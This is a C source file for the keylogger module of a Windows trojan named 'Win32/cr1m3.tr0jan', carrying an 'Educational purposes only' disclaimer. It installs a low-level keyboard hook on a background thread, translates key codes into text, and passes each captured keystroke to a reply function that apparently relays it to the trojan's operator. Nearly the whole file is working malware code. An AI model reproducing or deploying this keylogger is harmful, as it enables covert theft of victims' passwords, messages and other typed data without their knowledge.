/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/


#include "windows.h"
#include "api.h"
#include "task_reply.h"
#include "keylogger.h"

void *hThread;
unsigned long thID;

struct vkey {
	unsigned short iKeyCode;
	char *strKey;
};

struct vkey vkeys[] = {
// Buttons keys
{0x0008, "[BACKSPACE]"},{0x0009, "[TAB]"},
{0x000D, "[ENTER]"},{0x0010, "[SHIFT]"},
{0x0011, "[CTRL]"},{0x0012, "[ALT]"},
{0x0013, "[PAUSE]"},{0x0014, "[CAPS LOCK]"},
{0x001B, "[ESC]"},{0x0020, " "},
{0x0021, "[PAGE UP]"},{0x0022, "[PAGE DOWN]"},
{0x002E, "[DEL]"},

//Num and Letters
{0x0030, "0"},{0x0031, "1"},{0x0032, "2"},{0x0033, "3"},{0x0034, "4"},
{0x0035, "5"},{0x0036, "6"},{0x0037, "7"},{0x0038, "8"},{0x0039, "9"},
{0x0041, "a"},{0x0042, "b"},{0x0043, "c"},{0x0044, "d"},{0x0045, "e"},
{0x0046, "f"},{0x0047, "g"},{0x0048, "h"},{0x0049, "i"},{0x004A, "j"},
{0x004B, "k"},{0x004C, "l"},{0x004D, "m"},{0x004E, "n"},{0x004F, "o"},
{0x0050, "p"},{0x0051, "q"},{0x0052, "r"},{0x0053, "s"},{0x0054, "t"},
{0x0055, "u"},{0x0056, "v"},{0x0057, "w"},{0x0058, "x"},{0x0059, "y"},
{0x005A, "z"},
//NumPad
{0x0060, "0"},{0x0061, "1"},{0x0062, "2"},{0x0063, "3"},{0x0064, "4"},
{0x0065, "5"},{0x0066, "6"},{0x0067, "7"},{0x0068, "8"},{0x0069, "9"},
{0x006A, "*"},{0x006B, "+"},{0x006A, "[SEPARATOR]"},{0x006D, "-"},
{0x006E, "."},{0x006F, "/"},

//Others
{0x00A0, "[SHIFT]"},{0x00A1, "[SHIFT]"},{0x00A2, "[CTRL]"},{0x00A3, "[CTRL]"},
{0x00A4, "[ALT]"},{0x00A5, "[ALT GR]"},{0x00BA, ";"},{0x00BC, ","}, {0x00BE, ":"},
{0x00BF, "?"},{0x00DE, "\'"},{0x00DF, "!"} 
};


int __keylogger_stop(void) {
	if(thID!=0) {
		_TerminateThread(hThread, 0xFF);
		_CloseHandle(hThread);
		thID=0;
		return 1;
	}
	return 0;
}

int __keylogger_start(void) {
	void *main = MainKeyboard;
	PTHREAD_START_ROUTINE *MainThread=(PTHREAD_START_ROUTINE *)main;

	if(hThread==0x00||hThread==(void *)0xFFFFFFFF||hThread==(void *)0xCCCCCCCC) {
		hThread = _CreateThread(0x00, 0x00,MainThread, NULL, 0x00, &thID);
		return 1;
	}
	else {
		if(_OpenThread(0x00, 0x00, thID)==NULL) {
			hThread = _CreateThread(0x00, 0x00, MainThread, NULL, 0x00, &thID);
			return 1;
		}
	}
	
	return 0;
}

unsigned long __stdcall MainKeyboard(void *lParams) {
	void *hAppInstance;
	void *hwndFocus;
	MSG msg;

	hAppInstance = _GetModuleHandleA(NULL);
	hwndFocus = _GetFocus();

	if(_SetWindowsHookExA(13, ProcKeyboardHook, hAppInstance, 0)!=NULL) { // hook keyboard
		__push_reply("Keyboard hook: OK", 1);
	}
	else {
		__push_reply("Keyboard hook: ERROR", 1);
	}

	while(_GetMessageA(&msg, NULL, 0, 0)>0) {
		_TranslateMessage(&msg);
		_DispatchMessageA(&msg);
	}

	_ExitThread(0);

	return 0;
}

LRESULT __stdcall ProcKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	char key[20] = {0};
	int i = 0, a = 0;

	switch(wParam) {
		case 0x0100: //WM_KEYDOWN
			_ZeroMemory(key, 20);

			for(i=0;i<77;i++) {
					if(pKeyBoard->vkCode==vkeys[i].iKeyCode) {
						if(_GetKeyState(0xA0) & 0x8000 && _lstrlenA(vkeys[i].strKey)==1) {
							_snprintf(key, 20, "%c", _toupper((char)vkeys[i].strKey[0]));
						}
						else if(_GetKeyState(0xA1) & 0x8000 && _lstrlenA(vkeys[i].strKey)==1) {
							_snprintf(key, 20, "%c", _toupper((char)vkeys[i].strKey[0]));
						}
						else {
							_snprintf(key, 20, "%s", vkeys[i].strKey);
						}
						a++;
						break;
					}
			}

			if(a!=0) {
					__push_reply(key,OPTION_KEYLOGGER);
			}

		default:
			return _CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	return 0;
}
